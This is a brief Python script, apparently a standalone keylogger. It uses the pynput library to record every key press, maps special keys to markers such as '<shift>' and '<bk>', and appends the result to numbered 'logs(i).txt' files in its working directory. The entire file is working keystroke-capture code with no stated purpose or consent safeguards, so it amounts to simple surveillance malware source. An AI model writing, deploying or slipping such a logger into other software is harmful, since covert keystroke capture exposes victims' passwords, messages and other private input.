from pynput.keyboard import Listener
from os import getcwd, listdir

files = listdir(getcwd())
if len(files) == 2:
    i = 1
else:
    i = int(files[0][5:-5]) + 1

def log(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter in ['Key.shift_l', 'Key.shift_r', 'Key.shift']:
        letter = '<shift>'
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.backspace":
        letter = "<bk>"
    if letter == "Key.caps_lock":
        letter = "<cp>"

    with open(f"logs({i}).txt", "a") as f:
        f.write(letter)

with Listener(on_press=log) as l:
    l.join()